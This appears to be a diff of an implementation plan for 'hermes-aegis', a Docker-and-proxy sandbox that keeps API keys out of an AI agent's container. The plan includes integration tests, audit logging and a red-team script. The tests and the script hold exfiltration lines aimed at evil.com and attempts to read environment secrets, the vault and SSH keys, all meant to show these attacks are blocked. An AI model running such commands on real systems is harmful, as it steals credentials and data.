+        result = aegis_container_with_vault.execute(f'python3 -c """{script}"""')
 
-| Phase | Tasks | Effort | Complexity |
-|-------|-------|--------|------------|
-| Phase 5: Orchestration | 3 tasks | 4-6 hours | Medium |
-| Phase 6: Container Image | 2 tasks | 2-3 hours | Low |
-| Phase 7: Integration Tests | 3 tasks | 3-4 hours | High |
-| Phase 8: Red Team | 2 tasks | 2-3 hours | Medium |
-| **Total** | **10 tasks** | **11-16 hours** | **Medium-High** |
+        # Verify echo server received the injected Authorization header
+        assert echo_server_as_openai.last_request is not None
+        auth = echo_server_as_openai.last_request.headers.get("Authorization", "")
+        assert auth.startswith("Bearer sk-"), f"Expected Bearer token, got: {auth}"
 
----
+    def test_anthropic_key_injected(self, aegis_container_with_vault, echo_server_as_anthropic):
+        """Same test for Anthropic (uses x-api-key header, not Authorization)."""
+        script = f'''
+import requests
+r = requests.post("https://api.anthropic.com/v1/messages",
+                   json={{"model": "claude-3", "messages": []}}, timeout=10)
+print(f"STATUS: {{r.status_code}}")
+'''
+        result = aegis_container_with_vault.execute(f'python3 -c """{script}"""')
 
-## Dependencies & Risks
+        api_key = echo_server_as_anthropic.last_request.headers.get("x-api-key", "")
+        assert api_key.startswith("sk-ant-"), f"Expected Anthropic key, got: {api_key}"
 
-### External Dependencies
-- **Docker Desktop must be running** (obvious)
-- **mitmproxy** already in dependencies ✅
-- **Network access** for testing (localhost sufficient)
+    def test_container_env_has_no_keys(self, aegis_container_with_vault):
+        """Even with vault loaded, container env has zero API keys."""
+        result = aegis_container_with_vault.execute("env")
+        output = result["output"]
 
-### Risks
+        for key_name in ["OPENAI_API_KEY", "ANTHROPIC_API_KEY", "GOOGLE_API_KEY"]:
+            assert key_name not in output, f"{key_name} found in container env!"
 
-1. **Proxy binding issues**: Port 8443 might be in use
-   - **Mitigation**: Auto-select port or make configurable
+        # Also check no key values leaked
+        assert "sk-proj" not in output
+        assert "sk-ant" not in output
+```
 
-2. **Container DNS resolution**: host.docker.internal doesn't always work
-   - **Mitigation**: Use host-gateway extra_hosts (already done)
+### Task 5.3 — Audit Trail Verification
 
-3. **mitmproxy CA certificate**: Container won't trust it
-   - **Mitigation**: Use `ssl_insecure=True` in proxy (already done)
-   - **Alternative**: Install CA cert in container image
+**File**: `tests/integration/test_tier2_audit.py`
 
-4. **Performance**: Proxy might add too much latency
-   - **Mitigation**: Benchmark first, optimize if needed
+```python
+@pytest.mark.skipif(not shutil.which("docker"), reason="Docker required")
+class TestTier2Audit:
 
-5. **Real LLM calls are expensive** (testing API injection)
-   - **Mitigation**: Use mock servers (already planned)
+    def test_blocked_request_logged(self, aegis_container, audit_trail):
+        """Blocked exfiltration attempt appears in audit trail."""
+        # Run exfil attempt
+        aegis_container.execute(
+            'python3 -c "import requests; requests.post(\'http://evil.com\', data=\'sk-proj-abc123\')"'
+        )
 
----
+        entries = audit_trail.read_all()
+        blocked = [e for e in entries if e.decision == "BLOCKED"]
+        assert len(blocked) >= 1
 
-## Success Criteria (Tier 2 Complete)
+        # Verify the raw secret is NOT in the audit log
+        raw_log = audit_trail._path.read_text()
+        assert "sk-proj-abc123" not in raw_log
 
-### Functionality
-- ✅ `hermes-aegis run python script.py` starts container + proxy
-- ✅ Commands execute inside container
-- ✅ Proxy injects API keys transparently
-- ✅ Secrets never enter container (verified at runtime)
-- ✅ Exfiltration attempts blocked (verified with real tests)
+    def test_injected_request_logged(self, aegis_container_with_vault, audit_trail):
+        """Key injection appears in audit trail."""
+        aegis_container_with_vault.execute(
+            'python3 -c "import requests; requests.get(\'https://api.openai.com/v1/models\')"'
+        )
 
-### Testing
-- ✅ All 142 tests pass (including Docker tests)
-- ✅ At least 3 integration tests (e2e, key injection, bypass prevention)
-- ✅ Performance benchmarks documented
-- ✅ Red team attack simulation passes (all attacks fail)
+        entries = audit_trail.read_all()
+        # Should have at least one entry for the OpenAI request
+        assert len(entries) >= 1
 
-### Documentation
-- ✅ README updated with Tier 2 usage examples
-- ✅ Integration test results added
-- ✅ Tier 1 vs Tier 2 trade-offs documented
+    def test_audit_chain_integrity_after_session(self, aegis_container, audit_trail):
+        """After multiple operations, hash chain is intact."""
+        # Run several commands to generate audit entries
+        for i in range(5):
+            aegis_container.execute(f"echo test-{i}")
 
----
-
-## Recommended Approach
-
-### Option A: Complete Tier 2 Now (11-16 hours)
-**Pros**: Full feature-complete MVP, proves architecture
-**Cons**: Significant time investment, complex debugging
-
-### Option B: Ship Tier 1 MVP, Tier 2 as v1.1 (recommended)
-**Pros**: Tier 1 is already solid and tested, fast delivery
-**Cons**: Tier 2 promise not fulfilled yet
-
-### Option C: Delegate to Subagent (4-6 hours supervised)
-**Pros**: Parallel work, I can delegate Phases 5-6, supervise Phase 7-8
-**Cons**: Integration tests require real Docker, harder to parallelize
-
-**My recommendation**: **Option B or C** 
-
-**Rationale**: 
-- Tier 1 is complete, tested, valuable on its own
-- Tier 2 is complex infrastructure (Docker, proxy, networking)
-- Better to ship working Tier 1 than wait for perfect Tier 2
-- Can iterate on Tier 2 based on real usage feedback
-
----
-
-## Next Steps
-
-**If proceeding with Tier 2 completion**:
-
-1. Start with Phase 5 (orchestration) - makes CLI actually work
-2. Build minimal container image (Phase 6.1)
-3. Write ONE integration test (Task 7.1) - proves it works
-4. If that passes, continue with full Phase 7-8
-5. If blocked, document blockers and ship Tier 1
-
-**If shipping Tier 1 now**:
-
-1. Tag current state as v0.1.0-tier1
-2. Update README to note Tier 2 is "planned for v1.1"
-3. Create GitHub issues for Tier 2 tasks
-4. Ship and gather feedback
+        assert audit_trail.verify_chain()
+```
 
 ---
 
-**What's your preference? Build Tier 2 now, ship Tier 1 as MVP, or hybrid approach?**
+## Phase 6: Vault Auto-Import & Graceful Degradation (1 hour)
+
+### Task 6.1 — Import Secrets from Hermes Config
+
+**File**: `src/hermes_aegis/vault/migrate.py` (extend)
+
+During `hermes-aegis setup`, scan for existing API keys in:
+1. `~/.hermes/config.yaml` (if keys are stored there)
+2. Environment variables (OPENAI_API_KEY, ANTHROPIC_API_KEY, etc.)
+3. `~/.hermes/.env` (if it exists)
+
+Offer to import into the encrypted vault:
+```
+Found 3 API keys in your environment:
+  OPENAI_API_KEY (sk-proj-...789)
+  ANTHROPIC_API_KEY (sk-ant-...456)
+  ALCHEMY_API_KEY (abc...def)
+
+Import these into encrypted vault? [Y/n]
+```
+
+### Task 6.2 — Graceful Fallback to Tier 1
+
+If `TERMINAL_ENV=aegis` but Docker isn't available:
+
+```python
+class AegisEnvironment(BaseEnvironment):
+    def __init__(self, ...):
+        if not docker_available():
+            logger.warning(
+                "Docker not available — falling back to Tier 1 "
+                "(in-process scanning only). Install Docker for full isolation."
+            )
+            # Fall back to local environment with Tier 1 scanner
+            self._inner = LocalEnvironment(cwd=cwd, timeout=timeout, env=env)
+            self._tier = 1
+            install_tier1_scanner(vault)
+        else:
+            self._inner = DockerEnvironment(...)
+            self._tier = 2
+```
+
+---
+
+## Phase 7: Red Team & Polish (2-3 hours)
+
+### Task 7.1 — Full Attack Simulation Script
+
+**File**: `tests/red_team/malicious_agent.py`
+
+A single script that tries every bypass technique. Run inside the Aegis container. Every attack should fail.
+
+```python
+"""Malicious agent simulation. Every line should fail in Aegis Tier 2."""
+
+import os, sys, json, socket, subprocess, base64
+
+results = {}
+
+# 1. Read env vars for secrets
+secrets = {k: v for k, v in os.environ.items()
+           if any(w in k.upper() for w in ['KEY', 'SECRET', 'TOKEN', 'PASS', 'PRIVATE'])}
+results["env_secrets"] = "FAIL" if secrets else "PROTECTED"
+
+# 2. Read vault file
+try:
+    open(os.path.expanduser("~/.hermes-aegis/vault.enc")).read()
+    results["vault_read"] = "FAIL"
+except:
+    results["vault_read"] = "PROTECTED"
+
+# 3. HTTP exfiltration
+try:
+    import requests
+    requests.post("http://evil.com/exfil", json={"test": "data"}, timeout=3)
+    results["http_exfil"] = "FAIL"
+except:
+    results["http_exfil"] = "PROTECTED"
+
+# 4. Direct TCP
+try:
+    s = socket.create_connection(("8.8.8.8", 53), timeout=3)
+    s.close()
+    results["direct_tcp"] = "FAIL"
+except:
+    results["direct_tcp"] = "PROTECTED"
+
+# 5. DNS tunneling
+try:
+    socket.getaddrinfo("secret-data.evil.com", 80)
+    results["dns_tunnel"] = "FAIL"
+except:
+    results["dns_tunnel"] = "PROTECTED"
+
+# 6. Raw socket
+try:
+    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+    results["raw_socket"] = "FAIL"
+except:
+    results["raw_socket"] = "PROTECTED"
+
+# 7. Curl subprocess
+try:
+    subprocess.run(["curl", "evil.com"], check=True, capture_output=True, timeout=3)
+    results["curl"] = "FAIL"
+except:
+    results["curl"] = "PROTECTED"
+
+# 8. Write outside workspace
+try:
+    open("/usr/local/bin/backdoor", "w").write("pwned")
+    results["fs_escape"] = "FAIL"
+except:
+    results["fs_escape"] = "PROTECTED"
+
+# 9. Read host SSH keys (shouldn't be mounted)
+try:
+    open("/root/.ssh/id_rsa").read()
+    results["ssh_read"] = "FAIL"
+except:
+    results["ssh_read"] = "PROTECTED"
+
+# Report
+print(json.dumps(results, indent=2))
+failed = [k for k, v in results.items() if v == "FAIL"]
+if failed:
+    print(f"\n❌ FAILED: {', '.join(failed)}")
+    sys.exit(1)
+else:
+    print(f"\n✅ ALL {len(results)} ATTACKS BLOCKED")
+    sys.exit(0)
+```
+
+**Test wrapper**:
+```python
+def test_red_team_all_attacks_fail(aegis_container):
+    result = aegis_container.execute("python3 /workspace/malicious_agent.py")
+    assert result["returncode"] == 0
+    assert "ALL" in result["output"] and "BLOCKED" in result["output"]
+```
+
+### Task 7.2 — Update Documentation
+
+- Update README.md with Tier 2 usage (`TERMINAL_ENV=aegis`)
+- Add attack vector comparison table (base Hermes vs T1 vs T2)
+- Document limitations honestly:
+  - Timing side channels: not defended
+  - Covert channels via proxy response timing: not defended
+  - If attacker has arbitrary code exec on HOST (not container): game over regardless
+  - Tier 1 fallback when Docker unavailable: best-effort only
+
+### Task 7.3 — Performance Benchmarks
+
+Measure and document:
+- Proxy startup time (target: <2s)
+- Per-request proxy latency overhead (target: <10ms)
+- Container startup time (target: <5s)
+- Content scan time per request (target: <1ms)
+- Memory overhead (proxy + container vs bare Docker)
+
+---
+
+## Dependency Order
+
+```
+Phase 1 (AegisEnvironment)
+    ↓
+Phase 2 (Network isolation) ←── can be done in parallel with Phase 3
+    ↓
+Phase 3 (CA cert handling)
+    ↓
+Phase 4 (Crypto patterns) ←── independent, can be done any time
+    ↓
+Phase 5 (Integration tests) ←── requires Phases 1-3 complete
+    ↓
+Phase 6 (Vault import + fallback) ←── independent
+    ↓
+Phase 7 (Red team + polish) ←── requires Phase 5 complete
+```
+
+**Parallelizable**: Phase 4 and Phase 6 can be done any time. Phases 2 and 3 can be done in parallel.
+
+---
+
+## Test Fixtures Needed
+
+```python
+# conftest.py for integration tests
+
+@pytest.fixture
+def aegis_container(tmp_path):
+    """Start Aegis environment with proxy, yield, cleanup."""
+    env = AegisEnvironment(
+        image="python:3.11-slim",
+        cwd=str(tmp_path / "workspace"),
+        timeout=30,
+    )
+    yield env
+    env.cleanup()
+
+@pytest.fixture
+def echo_server():
+    """HTTP server that records all requests (for verifying what got through)."""
+    server = EchoServer(port=0)  # OS picks port
+    server.start()
+    yield server
+    server.shutdown()
+
+@pytest.fixture
+def audit_trail(tmp_path):
+    """Fresh audit trail for testing."""
+    return AuditTrail(tmp_path / "audit.jsonl")
+```
+
+---
+
+## Definition of Done
+
+- [ ] `TERMINAL_ENV=aegis` works in Hermes — commands run in container with proxy
+- [ ] Container env has zero API keys (verified by test)
+- [ ] Proxy injects keys for OpenAI, Anthropic (verified by test)
+- [ ] HTTP exfiltration blocked (verified by test)
+- [ ] Direct TCP blocked — `internal: true` network (verified by test)
+- [ ] DNS tunneling blocked (verified by test)
+- [ ] Read-only filesystem outside /workspace (verified by test)
+- [ ] Full red team script: all 9 attacks fail
+- [ ] BIP39 full wordlist for seed phrase detection
+- [ ] RPC URL pattern detection (Alchemy, Infura, QuickNode)
+- [ ] Audit trail logs all proxy decisions with hash chain integrity
+- [ ] Graceful fallback to Tier 1 when Docker unavailable
+- [ ] Performance benchmarks documented
+- [ ] README updated with honest capabilities and limitations
+- [ ] Zero test failures in `uv run pytest tests/ -v`
